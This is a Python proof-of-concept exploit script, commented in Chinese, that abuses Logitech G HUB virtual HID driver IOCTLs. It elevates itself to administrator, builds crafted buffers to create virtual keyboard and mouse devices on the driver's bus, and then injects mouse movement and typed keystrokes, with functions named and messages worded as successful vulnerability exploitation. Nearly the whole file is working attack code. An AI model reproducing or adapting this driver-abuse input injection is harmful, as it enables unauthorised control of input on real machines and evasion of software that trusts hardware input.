import ctypes
import os
import sys
import time
from ctypes import wintypes

# --- 常量定义 (与之前相同) ---
DRIVER_SERVICE_XLCOR = "logi_joy_xlcore"
DRIVER_SERVICE_BUS = "logi_joy_bus_enum"
BUS_DEVICE_PATH = "\\\\?\\root#system#0001#{dfbedcdb-2148-416d-9e4d-cecc2424128c}"
VULNERABLE_DEVICE_PATHS = [
    "\\\\.\\ROOT#SYSTEM#0001#{1abc05c0-c378-41b9-9cef-df1aba82b015}",
    "\\\\.\\ROOT#SYSTEM#0002#{1abc05c0-c378-41b9-9cef-df1aba82b015}",
]
IOCTL_CREATE_DEVICE = 0x2A2000
IOCTL_DESTROY_DEVICE = 0x2A2004
IOCTL_MOVE_MOUSE = 0x2A2010
IOCTL_SEND_KEYBOARD = 0x2A200C

# --- API & 结构体定义 (与之前相同) ---
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
shell32 = ctypes.WinDLL('shell32', use_last_error=True)
wintypes.SC_HANDLE = wintypes.HANDLE
LPCWSTR, DWORD = wintypes.LPCWSTR, wintypes.DWORD
GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING = 0x80000000, 0x40000000, 3
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
SC_MANAGER_ALL_ACCESS = 0x000F003F
SERVICE_ALL_ACCESS = 0x000F01FF
ERROR_SERVICE_ALREADY_RUNNING = 1056
# (为节省篇幅，省略了其他API原型定义)
advapi32.OpenSCManagerW.restype = wintypes.SC_HANDLE; advapi32.OpenSCManagerW.argtypes = [LPCWSTR, LPCWSTR, DWORD]
advapi32.OpenServiceW.restype = wintypes.SC_HANDLE; advapi32.OpenServiceW.argtypes = [wintypes.SC_HANDLE, LPCWSTR, DWORD]
advapi32.StartServiceW.restype = wintypes.BOOL; advapi32.StartServiceW.argtypes = [wintypes.SC_HANDLE, DWORD, ctypes.POINTER(LPCWSTR)]
advapi32.CloseServiceHandle.restype = wintypes.BOOL; advapi32.CloseServiceHandle.argtypes = [wintypes.SC_HANDLE]
kernel32.CreateFileW.restype = wintypes.HANDLE; kernel32.CreateFileW.argtypes = [LPCWSTR, DWORD, DWORD, ctypes.c_void_p, DWORD, DWORD, wintypes.HANDLE]
kernel32.DeviceIoControl.restype = wintypes.BOOL; kernel32.DeviceIoControl.argtypes = [wintypes.HANDLE, DWORD, ctypes.c_void_p, DWORD, ctypes.c_void_p, DWORD, ctypes.POINTER(DWORD), ctypes.c_void_p]
kernel32.CloseHandle.restype = wintypes.BOOL; kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
shell32.ShellExecuteW.restype = wintypes.HINSTANCE; shell32.ShellExecuteW.argtypes = [wintypes.HWND, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, wintypes.INT]
class MOUSE_IO(ctypes.Structure): _fields_ = [('button', ctypes.c_byte), ('x', ctypes.c_byte), ('y', ctypes.c_byte), ('wheel', ctypes.c_byte), ('unk1', ctypes.c_byte)]
class KEYBOARD_IO(ctypes.Structure): _fields_ = [('modifiers', ctypes.c_byte), ('reserved', ctypes.c_byte), ('keys', ctypes.c_byte * 6)]

# --- 核心功能函数 ---

def ensure_admin():
    """自动提权 (保留)"""
    try: is_admin = (os.getuid() == 0)
    except AttributeError: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if not is_admin:
        print("[!] 检测到非管理员权限，正在尝试自动提权...")
        ret = shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        if ret <= 32: print(f"[!] 提权失败，错误码: {ret}")
        sys.exit(0)

# ==================== 代码修改处 ====================
# 替换`ensure_driver_is_running`为一个更简单的`start_service`函数
def start_service(service_name):
    """打开并启动一个已安装的服务"""
    sc_manager = advapi32.OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
    if not sc_manager:
        raise ctypes.WinError(ctypes.get_last_error())
    
    try:
        service = advapi32.OpenServiceW(sc_manager, service_name, SERVICE_ALL_ACCESS)
        if not service:
            # 服务不存在，说明驱动未通过INF安装
            raise Exception(f"服务 '{service_name}' 不存在！请先使用INF文件安装驱动。")
        
        try:
            if not advapi32.StartServiceW(service, 0, None):
                last_error = ctypes.get_last_error()
                if last_error == ERROR_SERVICE_ALREADY_RUNNING:
                    print(f"[*] 服务 '{service_name}' 已在运行。")
                else:
                    raise ctypes.WinError(last_error)
            else:
                print(f"[+] 服务 '{service_name}' 启动成功。")
        finally:
            advapi32.CloseServiceHandle(service)
    finally:
        advapi32.CloseServiceHandle(sc_manager)
# ====================================================

# (create_virtual_device, destroy_device, exploit_mouse_vulnerability, exploit_keyboard_vulnerability 函数与之前相同，无需修改)
def create_virtual_device(bus_handle, device_type):
    """创建虚拟设备（键盘或鼠标）并返回其设备ID"""
    bytes_returned = DWORD()
    if device_type == 'keyboard':
        print("[+] 正在构建并发送“创建键盘”数据包...")
        buffer = ctypes.create_string_buffer(246); ctypes.memset(buffer, 0, 246)
        pid_vid_part = "LGHUBDevice\\VID_046D&PID_C232".encode('utf-16le'); magic_int1 = -1036909459; dev_type_flag = 0
        hid_desc = bytes([0x05, 0x01, 0x09, 0x06, 0xA1, 0x01, 0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02, 0x95, 0x01, 0x75, 0x08, 0x81, 0x01, 0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02, 0x95, 0x01, 0x75, 0x03, 0x91, 0x01, 0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00, 0xC0])
    elif device_type == 'mouse':
        print("[+] 正在构建并发送“创建鼠标”数据包...")
        buffer = ctypes.create_string_buffer(254); ctypes.memset(buffer, 0, 254)
        pid_vid_part = "LGHUBDevice\\VID_046D&PID_C231".encode('utf-16le'); magic_int1 = -1036974995; dev_type_flag = 1
        hid_desc = bytes([0x05, 0x01, 0x09, 0x02, 0xA1, 0x01, 0x09, 0x01, 0xA1, 0x00, 0x05, 0x09, 0x19, 0x01, 0x29, 0x05, 0x15, 0x00, 0x25, 0x01, 0x95, 0x05, 0x75, 0x01, 0x81, 0x02, 0x95, 0x01, 0x75, 0x03, 0x81, 0x01, 0x05, 0x01, 0x09, 0x30, 0x09, 0x31, 0x09, 0x38, 0x15, 0x81, 0x25, 0x7F, 0x75, 0x08, 0x95, 0x03, 0x81, 0x06, 0xC0, 0xC0])
    else: raise ValueError("无效的设备类型")
    ctypes.memmove(ctypes.addressof(buffer) + 0,   ctypes.byref(ctypes.c_uint32(183)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 8,   ctypes.byref(ctypes.c_uint32(1)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 12,  ctypes.byref(ctypes.c_uint32(62)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 16,  pid_vid_part, len(pid_vid_part))
    ctypes.memmove(ctypes.addressof(buffer) + 144, ctypes.byref(ctypes.c_int32(magic_int1)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 148, ctypes.byref(ctypes.c_uint32(dev_type_flag)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 182, hid_desc, len(hid_desc))
    ctypes.memmove(ctypes.addressof(buffer) + 178, ctypes.byref(ctypes.c_uint32(len(hid_desc))), 4)
    if not kernel32.DeviceIoControl(bus_handle, IOCTL_CREATE_DEVICE, buffer, ctypes.sizeof(buffer), buffer, ctypes.sizeof(buffer), ctypes.byref(bytes_returned), None):
        raise ctypes.WinError(ctypes.get_last_error())
    device_id = ctypes.c_uint32.from_address(ctypes.addressof(buffer) + 4).value
    print(f"[+] “创建{device_type}”的IOCTL已成功发送，获得设备ID: {device_id}")
    return device_id
def destroy_device(bus_handle, device_id, device_type):
    if not device_id: return
    print(f"[+] 正在销毁 {device_type} (ID: {device_id})...")
    buffer = ctypes.create_string_buffer(20); ctypes.memset(buffer, 0, 20)
    ctypes.memmove(ctypes.addressof(buffer) + 0, ctypes.byref(ctypes.c_uint32(20)), 4)
    ctypes.memmove(ctypes.addressof(buffer) + 4, ctypes.byref(ctypes.c_uint32(device_id)), 4)
    type_flag = 0 if device_type == 'keyboard' else 1 if device_type == 'mouse' else 2
    ctypes.memmove(ctypes.addressof(buffer) + 8, ctypes.byref(ctypes.c_uint32(type_flag)), 4)
    bytes_returned = DWORD()
    try:
        if not kernel32.DeviceIoControl(bus_handle, IOCTL_DESTROY_DEVICE, buffer, ctypes.sizeof(buffer), None, 0, ctypes.byref(bytes_returned), None):
            raise ctypes.WinError(ctypes.get_last_error())
        print(f"[+] 成功发送销毁 {device_type} (ID: {device_id}) 的请求。")
    except Exception as e:
        print(f"[!] 销毁设备 {device_id} 时发生错误: {e}")
def exploit_mouse_vulnerability(device_handle):
    print("[+] 正在模拟鼠标移动...")
    for i in range(5):
        mouse_input = MOUSE_IO(button=0, x=-20, y=0, wheel=0, unk1=0)
        bytes_returned = DWORD()
        if not kernel32.DeviceIoControl(device_handle, IOCTL_MOVE_MOUSE, ctypes.byref(mouse_input), ctypes.sizeof(mouse_input), None, 0, ctypes.byref(bytes_returned), None):
            raise ctypes.WinError(ctypes.get_last_error())
        time.sleep(0.1)
    print("✅ 漏洞利用成功：已模拟鼠标移动！")
def exploit_keyboard_vulnerability(device_handle):
    print("\n[+] 正在模拟键盘输入...")
    print("[!] 请在5秒内将光标点进一个文本编辑器（如记事本）...")
    time.sleep(5)
    hid_key_codes = {'h': 0x0b, 'e': 0x08, 'l': 0x0f, 'o': 0x12}
    word_to_type = "hello"
    release_report = KEYBOARD_IO(modifiers=0, reserved=0, keys=(ctypes.c_byte * 6)(0,0,0,0,0,0))
    bytes_returned = DWORD()
    for char in word_to_type:
        key_code = hid_key_codes.get(char.lower())
        if not key_code: continue
        press_report = KEYBOARD_IO(modifiers=0, reserved=0, keys=(ctypes.c_byte * 6)(key_code,0,0,0,0,0))
        if not kernel32.DeviceIoControl(device_handle, IOCTL_SEND_KEYBOARD, ctypes.byref(press_report), ctypes.sizeof(press_report), None, 0, ctypes.byref(bytes_returned), None):
            raise ctypes.WinError(ctypes.get_last_error())
        time.sleep(0.05)
        if not kernel32.DeviceIoControl(device_handle, IOCTL_SEND_KEYBOARD, ctypes.byref(release_report), ctypes.sizeof(release_report), None, 0, ctypes.byref(bytes_returned), None):
            raise ctypes.WinError(ctypes.get_last_error())
        time.sleep(0.1)
    print(f"✅ 漏洞利用成功：已尝试输入单词 '{word_to_type}'！")

def main():
    ensure_admin()
    
    bus_handle = None
    keyboard_id = None
    mouse_id = None
    device_handle = None
    
    try:
        # 确保驱动服务已启动
        # start_service(DRIVER_SERVICE_XLCOR)
        # start_service(DRIVER_SERVICE_BUS)
        # 如果vir_hid也需要，同样可以在这里启动
        # start_service("LGVirHid")

        # 后续逻辑与之前完全相同...
        print("[+] 正在打开总线设备...")
        bus_handle = kernel32.CreateFileW(BUS_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
        if bus_handle == INVALID_HANDLE_VALUE: raise ctypes.WinError(ctypes.get_last_error())

        try: keyboard_id = create_virtual_device(bus_handle, 'keyboard')
        except Exception: print(f"[*] 创建键盘失败（可能已存在或无需创建）。")

        try: mouse_id = create_virtual_device(bus_handle, 'mouse')
        except Exception: print(f"[*] 创建鼠标失败（可能已存在或无需创建）。")

        print("[*] 等待设备枚举完成...")
        time.sleep(3)

        for path in VULNERABLE_DEVICE_PATHS:
            handle = kernel32.CreateFileW(path, GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
            if handle != INVALID_HANDLE_VALUE:
                print(f"[+] 成功打开虚拟设备句柄: {path}")
                device_handle = handle
                break
        
        if not device_handle:
            raise Exception("未能获取到虚拟设备的有效句柄。请确认驱动已通过INF正确安装。")
        
        exploit_mouse_vulnerability(device_handle)
        exploit_keyboard_vulnerability(device_handle)

    except Exception as e:
        print(f"\n[!] 发生错误: {e}")
    finally:
        if device_handle and device_handle != INVALID_HANDLE_VALUE:
             kernel32.CloseHandle(device_handle)

        if bus_handle and bus_handle != INVALID_HANDLE_VALUE:
            print("\n[*] --- 开始清理 ---")
            destroy_device(bus_handle, keyboard_id, 'keyboard')
            destroy_device(bus_handle, mouse_id, 'mouse')
            kernel32.CloseHandle(bus_handle)
            print("[*] --- 清理完毕 ---")

    print("\n[*] 脚本执行完毕。")
    input("按 Enter 键退出...")

if __name__ == "__main__":
    main()